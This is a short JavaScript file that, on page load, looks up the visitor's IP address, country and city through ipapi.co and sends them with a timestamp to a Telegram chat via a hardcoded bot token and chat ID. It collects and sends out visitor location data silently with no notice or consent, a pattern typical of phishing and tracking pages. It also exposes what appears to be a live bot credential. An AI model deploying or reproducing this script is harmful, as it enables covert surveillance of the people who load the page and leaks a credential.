// Function to get user's IP address and send it to Telegram bot
function sendIpInfoToTelegram(ip, country, city, time) {
    const botToken = '6612120625:AAGiYFb88nznW3-9DqddswMgWL1uK08DNrg'; // Replace with your Telegram bot token
    const chatId = '1136349337'; // Replace with your chat ID
    const message = `User IP: ${ip}\nCountry: ${country}\nCity: ${city}\nTime: ${time}`;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(url)
        .then(response => {
            if (response.ok) {
                console.log('Message sent successfully');
            } else {
                console.log('Failed to send message');
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });
}

// Fetch user's IP address and additional information
fetch('https://ipapi.co/json/')
    .then(response => response.json())
    .then(data => {
        const userIp = data.ip;
        const userCountry = data.country_name;
        const userCity = data.city;
        const userTime = new Date().toLocaleString();
        sendIpInfoToTelegram(userIp, userCountry, userCity, userTime);
    })
    .catch(error => {
        console.error('Error fetching IP address:', error);
    });
